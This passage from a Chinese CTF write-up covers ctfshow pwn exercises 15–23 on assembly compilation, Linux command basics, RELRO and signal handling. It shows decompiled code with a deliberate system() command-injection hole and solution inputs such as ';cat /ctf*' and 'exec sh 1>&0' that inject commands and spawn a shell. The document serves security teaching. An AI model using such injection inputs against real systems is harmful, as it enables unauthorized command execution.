data-src=\"https://z1.ax1x.com/2023/09/19/pP5iSjx.png\" alt=\"\" /></p>\n<p>【asm】(题目附件文件为 pwn15.s，s 其实就是汇编代码文件)</p>\n<pre><code class=\"language-asm\">\t.file\t&quot;flag.c&quot;\n\t.text\n\t.section\t.rodata\n.LC0:\n\t.string\t&quot;ctfshow&#123;&quot;\n\t.text\n\t.globl\tctfshow\n\t.type\tctfshow, @function\nctfshow:\n.LFB0:\n\t.cfi_startproc\n\tpushq\t%rbp\n\t.cfi_def_cfa_offset 16\n\t.cfi_offset 6, -16\n\tmovq\t%rsp, %rbp\n\t.cfi_def_cfa_register 6\n\tsubq\t$32, %rsp\n\tmovq\t%rdi, -24(%rbp)\n\tleaq\t.LC0(%rip), %rdi\n\tmovl\t$0, %eax\n\tcall\tprintf@PLT\n\tmovl\t$0, -4(%rbp)\n\tjmp\t.L2\n.L3:\n\tmovl\t-4(%rbp), %eax\n\tmovslq\t%eax, %rdx\n\tmovq\t-24(%rbp), %rax\n\taddq\t%rdx, %rax\n\tmovzbl\t(%rax), %eax\n\tmovzbl\t%al, %eax\n\tmovl\t%eax, %edi\n\tcall\tputchar@PLT\n\taddl\t$1, -4(%rbp)\n.L2:\n\tcmpl\t$15, -4(%rbp)\n\tjle\t.L3\n\tmovl\t$125, %edi\n\tcall\tputchar@PLT\n\tnop\n\tleave\n\t.cfi_def_cfa 7, 8\n\tret\n\t.cfi_endproc\n.LFE0:\n\t.size\tctfshow, .-ctfshow\n\t.section\t.rodata\n.LC1:\n\t.string\t&quot;%2hhx&quot;\n\t.text\n\t.globl\tmain\n\t.type\tmain, @function\nmain:\n.LFB1:\n\t.cfi_startproc\n\tpushq\t%rbp\n\t.cfi_def_cfa_offset 16\n\t.cfi_offset 6, -16\n\tmovq\t%rsp, %rbp\n\t.cfi_def_cfa_register 6\n\tsubq\t$64, %rsp\n\tmovq\t%fs:40, %rax\n\tmovq\t%rax, -8(%rbp)\n\txorl\t%eax, %eax\n\tmovabsq\t$4122593792332543030, %rax\n\tmovabsq\t$3834596513518335287, %rdx\n\tmovq\t%rax, -32(%rbp)\n\tmovq\t%rdx, -24(%rbp)\n\tmovl\t$825635894, -16(%rbp)\n\tmovb\t$0, -12(%rbp)\n\tmovl\t$0, -52(%rbp)\n\tjmp\t.L5\n.L6:\n\tleaq\t-48(%rbp), %rdx\n\tmovl\t-52(%rbp), %eax\n\tcltq\n\taddq\t%rax, %rdx\n\tmovl\t-52(%rbp), %eax\n\taddl\t%eax, %eax\n\tleaq\t-32(%rbp), %rcx\n\tcltq\n\taddq\t%rcx, %rax\n\tleaq\t.LC1(%rip), %rsi\n\tmovq\t%rax, %rdi\n\tmovl\t$0, %eax\n\tcall\t__isoc99_sscanf@PLT\n\taddl\t$1, -52(%rbp)\n.L5:\n\tcmpl\t$15, -52(%rbp)\n\tjle\t.L6\n\tleaq\t-48(%rbp), %rax\n\tmovq\t%rax, %rdi\n\tcall\tctfshow\n\tmovl\t$0, %eax\n\tmovq\t-8(%rbp), %rsi\n\txorq\t%fs:40, %rsi\n\tje\t.L8\n\tcall\t__stack_chk_fail@PLT\n.L8:\n\tleave\n\t.cfi_def_cfa 7, 8\n\tret\n\t.cfi_endproc\n.LFE1:\n\t.size\tmain, .-main\n\t.ident\t&quot;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0&quot;\n\t.section\t.note.GNU-stack,&quot;&quot;,@progbits\n</code></pre>\n<p>使用命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc <span class=\"token parameter variable\">-c</span> pwn16.s</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>gcc pwn16.o  <span class=\"token comment\">#不用 - o 指定生成文件名默认为 a.out</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5FnJJ.png\" alt=\"\" /></p>\n<h1 id=\"pwn17-linux命令基础\"><a class=\"anchor\" href=\"#pwn17-linux命令基础\">#</a> pwn17 (Linux 命令基础)</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhbmRhb3l1L2FydGljbGUvZGV0YWlscy8xMTcyOTY5MDc=\">https://blog.csdn.net/bandaoyu/article/details/117296907</span></p>\n<p>逐条执行命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span>  <span class=\"token comment\">#即使命令执行错误也不影响后面的命令继续执行</span></pre></td></tr></table></figure><h2 id=\"题目-12\"><a class=\"anchor\" href=\"#题目-12\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5AmvR.png\" alt=\"\" /></p>\n<p>64 位程序，保护全开，ida 看一下</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-1Ch] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> dest<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ah] [rbp-16h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Eh] [rbp-12h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span>_bss_start<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_D48<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_DC0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_E40<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_ED0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_F60<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_FE8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>asc_1080<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>aClassifyCtfsho<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Type  : Linux_Security_Mechanisms                               \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Site  : https://ctf.show/                                       \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * Hint  : You should understand the basic command usage of Linux! \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>dest <span class=\"token operator\">=</span> <span class=\"token number\">790655852</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nHow much do you know about Linux commands? \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    v4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nEnter the command you want choose:(1.2.3.4 or 5)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span> v4 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Which directory?('/','./' or the directiry you want?)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0xAuLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token function\">strcat</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span>dest<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Execution succeeded!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$cat /ctfshow_flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">1u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ctfshow&#123;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"... ...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">3u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Your flag is ...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">5u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ctfshow&#123;flag is not here!&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x14u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wtf?You haven't left yet?\\nOk~ give you flag:\\nflag is loading......\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1BF52u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cat /ctfshow_flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">2u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"su: Authentication failure\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>      <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"See you!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>      <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"command not found!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>发现在 <code>case 3</code>  中，有 <code>system（&quot;cat /flag&quot;）</code> 但是中间会有等待时间（sleep（0x1bf52）单位为毫秒）</p>\n<p>而在 <code>case 2</code>  中，有一个 <code>strcat（）</code> 会将我们输入的值添加到 <code>dest</code>  后面，然后执行，在此输入 <code>cat /ctfshow_flag</code>  会导致无限循环（可能因为命令没有加；分割导致，并且没有清空 buf，导致不断执行）</p>\n<p>此处需要将命令利用 <code>;</code>  分开，分别执行， <code>read</code>  读 10 个字节，所以需要使用通配符 <code>*</code></p>\n<p>输入命令 <code>;cat /ctf*</code>  即可</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5eh6J.png\" alt=\"\" /></p>\n<h1 id=\"pwn18linux命令基础\"><a class=\"anchor\" href=\"#pwn18linux命令基础\">#</a> pwn18（Linux 命令基础）</h1>\n<h2 id=\"题目-13\"><a class=\"anchor\" href=\"#题目-13\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5eHk6.png\" alt=\"\" /></p>\n<p>64 位程序，保护全开了，ida 查看<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP5mEcQ.png\" alt=\"\" /></p>\n<p>fake()<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP5mVXj.png\" alt=\"\" /></p>\n<p>real()<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP5mn7q.md.png\" alt=\"\" /></p>\n<p>发现这个两个函数的输出定向符不同</p>\n<p><code>&gt;&gt;</code>  会换行，将命令产生的结果输出在已有文件内容的下一行开始</p>\n<p><code>&gt;</code>    命令的输出结果覆盖原有文件的内容（会清空旧内容）</p>\n<p>这两个重定向符如果指定输出的文件不存在就创建这个文件</p>\n<p>回到题目，由于我们要输出 flag，所以不能让原内容清空，就只能用 <code>fake()</code>  函数，也就是我们需要满足 <code>v4==9</code>  这个条件，即输入 9 即可</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5nlVI.png\" alt=\"\" /></p>\n<h1 id=\"pwn19linux基础命令\"><a class=\"anchor\" href=\"#pwn19linux基础命令\">#</a> pwn19（Linux 基础命令）</h1>\n<h2 id=\"题目-14\"><a class=\"anchor\" href=\"#题目-14\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5nYRS.png\" alt=\"\" /></p>\n<p>64 位程序，保护全开，ida 查看</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP5M0Zd.png\" alt=\"\" /></p>\n<p>发现调用了一个 fork 函数， <code>fork函数返回两次，子进程返回0，父进程返回子进程的pid</code> （执行返回值顺序是不定的），所以当是子进程返回 0 时才能到 <code>else</code>  段继续写入执行得到 flag</p>\n<p>又有一个 <code>fclose()</code>  函数，它关闭了一个输出流，我们要对其进行绕过，通过 <code>Linux命令</code> 中的 <code>exec 1&gt;&amp;0</code>  将标准输出流重定向到标准输入流里，并且在打开终端后都默认指向终端，所以会输出到终端上</p>\n<p>最后输入 <code>exec cat /ctf* 1&gt;&amp;0</code>  会将 flag 输出到终端上，也可以是 <code>exec sh 1&gt;&amp;0</code>  进行 shell 交互得到 flag</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP53ckj.png\" alt=\"\" /></p>\n<h1 id=\"pwn20relro保护\"><a class=\"anchor\" href=\"#pwn20relro保护\">#</a> pwn20（RELRO 保护）</h1>\n<p><strong>RELRO（RELocation Read-Only）</strong> 是一种可选的二进制保护机制，用于增加程序的安全性。它主要通过限制和保护全局偏移表（Global Offset Table，简称 GOT）和过程链接表（Procedure LinkageTable，简称 PLT）的可写性来防止针对这些结构的攻击。</p>\n<p>RELRO 保护有三种状态：</p>\n<ol>\n<li>No RELRO：在这种状态下，GOT 和 PLT 都是可写的，意味着攻击者可以修改这些表中的指针，从而进行攻击。这是最弱的保护状态。</li>\n<li>Partial RELRO：在这种状态下，GOT 的开头部分被设置为只读（RO），而剩余部分仍然可写。这样可以防止一些简单的攻击，但仍存在一些漏洞。</li>\n<li>Full RELRO：在这种状态下，GOT 和 PLT 都被设置为只读（RO）。这样做可以防止对这些结构的修改，提供更强的保护。任何对这些表的修改都会导致程序异常终止</li>\n</ol>\n<h2 id=\"题目-15\"><a class=\"anchor\" href=\"#题目-15\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP53vjK.png\" alt=\"\" /></p>\n<p>got 表是否可写通过保护 RELRO 查看，FULL RELRO 代表着 got 表不可写，<br />\nNO RELRO 代表可写，代表部分可写<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP58PNd.png\" alt=\"\" /><br />\n此处 <code>No RELRO</code>  代表 got 表可写，plt 表可写</p>\n<p>然后查看 <code>.got</code>  表和 <code>.plt.got</code>  表地址，利用命令在终端上直接输入 <code>readelf -s pwn20</code>  即可（也可利用 ida 查看）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/20/pPIkEMn.md.png\" alt=\"\" /></p>\n<p 1_1_0x600f18_0x600f28=\"\">ctfshow</p>\n<h1 id=\"pwn21relro保护\"><a class=\"anchor\" href=\"#pwn21relro保护\">#</a> pwn21（RELRO 保护）</h1>\n<h2 id=\"题目-16\"><a class=\"anchor\" href=\"#题目-16\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/20/pPIkMiF.png\" alt=\"\" /></p>\n<p>查看保护<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/20/pPIAPw6.png\" alt=\"\" /><br />\n发现是 <code>Partial RELRO</code>  保护开启了一部分， <code>got</code>  表开头部分被设置为只读，其他的剩余部分仍然可写，所以这里是 <code>got</code>  不可写， <code>.plt.got</code>  可写</p>\n<p>查看各表的地址<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/20/pPIAEfe.png\" alt=\"\" /></p>\n<p 0_1_0x600ff0_0x601000=\"\">ctfshow</p>\n<h1 id=\"pwn22-relro\"><a class=\"anchor\" href=\"#pwn22-relro\">#</a> pwn22 （RELRO）</h1>\n<h2 id=\"题目-17\"><a class=\"anchor\" href=\"#题目-17\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqrwPH.png\" alt=\"\" /></p>\n<p>查看保护</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqrsMt.png\" alt=\"\" /></p>\n<p>FULL RELRO:</p>\n<p>got 表和 plt 表都只读</p>\n<p>利用 <code>readelf -s pwn22</code>  查看表的地址，发现没有 <code>.got.plt</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/30/pPqrhGj.png\" alt=\"\" /></p>\n<p><code>ctfshow&#123;0_0_0x600fc0&#125;</code></p>\n<h1 id=\"pwn23signal信号处理\"><a class=\"anchor\" href=\"#pwn23signal信号处理\">#</a> pwn23（signal 信号处理）</h1>\n<h2 id=\"知识点\"><a class=\"anchor\" href=\"#知识点\">#</a> 知识点:</h2>\n<h3 id=\"1函数原型\"><a class=\"anchor\" href=\"#1函数原型\">#</a> 1. 函数原型</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span>（<span class=\"token operator\">*</span> signal（<span class=\"token keyword\">int</span> sig，<span class=\"token keyword\">void</span>（<span class=\"token operator\">*</span> func）（<span class=\"token keyword\">int</span>）））（<span class=\"token keyword\">int</span>）<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>关注内部的 <code>signal（int sig，void（* func）（int）)</code> ，sig 是指定的信号编号，用来以该指定的方式来处理信号（指定使用 sig 指定的信号编号处理信号的方法）<br />\n参数 func 指定程序可以处理信号的三种方式：</p>\n<ul>\n<li>默认处理（SIG_DFL）：信号由该特定信号的默认动作处理。</li>\n<li>忽略信号（SIG_IGN）：忽略信号，即使没有意义，代码执行仍将继续。</li>\n<li>函数处理程序：定义一个特定的函数来处理信号。</li>\n</ul>\n<h3 id=\"2有时候func这个参数-也可以是我们自定义的参数\"><a class=\"anchor\" href=\"#2有时候func这个参数-也可以是我们自定义的参数\">#</a> 2. 有时候 Func 这个参数 也可以是我们自定义的参数</h3>\n<p><code>signal(11,sigsegv_handler);</code> <br />\n 这里 11 也代指 <code>SIGSEGV</code> 【（信号分段违规）对存储的无效访问：当程序试图在已分配的内存之外读取或写入时】，意味着当程序想读写未分配给它的内存时，让 <code>sigsegv_handler</code>  函数来处理</p>\n<p>而 <code>sigsegv_handler</code>  函数可以自定义来执行</p>\n<p>所以我们需要触发对应的信号来执行 <code>信号处理函数</code></p>\n<h2 id=\"题目-18\"><a class=\"anchor\" href=\"#题目-18\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqroMq.png\" alt=\"\" /></p>\n<p>查看保护</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/30/pPqrbZT.png\" alt=\"\" /></p>\n<p>32 位程序，开启了 nx，先利用 ssh 连接一下</p>\n<p><code>ssh ctfshow@pwn.challenge.ctf.show -p28151</code> <br />\n 连接后根据提示输入 <code>yes</code>  和 <code>密码</code></p>\n<p><img 